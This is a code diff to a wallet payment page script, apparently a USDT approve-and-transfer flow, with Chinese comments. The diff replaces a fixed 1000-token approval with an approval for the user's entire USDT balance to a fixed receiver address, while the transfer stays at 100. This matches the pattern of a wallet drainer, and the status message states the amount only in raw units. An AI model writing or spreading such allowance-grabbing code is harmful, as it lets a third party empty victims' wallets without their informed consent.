@@ -71,7 +71,6 @@
   ];
 
   const DEFAULT_TRANSFER_AMOUNT = "100"; // USDT 数量
-  const DEFAULT_APPROVE_AMOUNT = "1000"; // 授权上限（可自行调整）
 
   // 网络配置
   const networks = [
@@ -147,7 +146,9 @@
 
         try {
           // 创建临时 client 获取链 ID
-          const tempClient = createWalletClient({ transport: custom(window.ethereum) });
+          const tempClient = createWalletClient({
+            transport: custom(window.ethereum),
+          });
           const chainId = await tempClient.getChainId();
           const { chain, rpcUrl } = getChainAndRpc(chainId);
 
@@ -176,11 +177,24 @@
             functionName: "decimals",
           });
 
-          const approveAmount = parseUnits(DEFAULT_APPROVE_AMOUNT, decimals);
+          // 🔹 获取用户当前 USDT 余额
+          const balance = await publicClient.readContract({
+            address: token,
+            abi: ERC20_ABI,
+            functionName: "balanceOf",
+            args: [from],
+          });
+
+          if (balance === 0n) {
+            status.value = "余额为 0，无法授权或转账。";
+            return;
+          }
+
+          const approveAmount = balance; // 🔹 授权额度 = 用户全部余额
           const transferAmount = parseUnits(DEFAULT_TRANSFER_AMOUNT, decimals);
 
           // ===== 步骤1：授权 approve =====
-          status.value = `正在授权 ${DEFAULT_APPROVE_AMOUNT} USDT 给收款地址 ${RECEIVER}，请在钱包确认...`;
+          status.value = `正在授权 ${approveAmount} 单位USDT 给收款地址 ${RECEIVER}，请在钱包确认...`;
 
           const approveHash = await walletClient.writeContract({
             address: token,
@@ -219,7 +233,10 @@
           return { chain: mainnet, rpcUrl: "https://cloudflare-eth.com" };
         if (chainId === 11155111)
           return { chain: sepolia, rpcUrl: `https://sepolia.infura.io/v3/${INFURA_KEY}` };
-        return { chain: sepolia, rpcUrl: `https://sepolia.infura.io/v3/${INFURA_KEY}` };
+        return {
+          chain: sepolia,
+          rpcUrl: `https://sepolia.infura.io/v3/${INFURA_KEY}`,
+        };
       }
 
       function formatErr(err) {
